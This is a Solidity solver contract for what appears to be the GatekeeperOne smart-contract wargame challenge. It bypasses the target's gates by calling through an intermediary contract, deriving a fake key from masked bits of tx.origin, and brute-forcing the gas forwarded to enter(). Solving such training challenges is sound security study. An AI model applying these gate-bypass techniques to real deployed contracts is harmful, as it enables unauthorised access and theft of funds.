pragma solidity ^0.8.0;

import "hardhat/console.sol";
interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperOneSolver {
    IGatekeeperOne challenge;

    constructor(address addr) {
        challenge = IGatekeeperOne(addr);
    }

    modifier gateTwo() {
        require(msg.sender == tx.origin);
        _;
    }

    function solve(uint _gas) external payable {
        console.log("Trying gas %s", _gas);
        challenge.enter{gas: _gas}(
            bytes8(uint64(uint160(address(tx.origin)))) & 0xffffffff0000ffff
        );
    }

    function getGasCount() public gateTwo {}

    receive() external payable {}
}
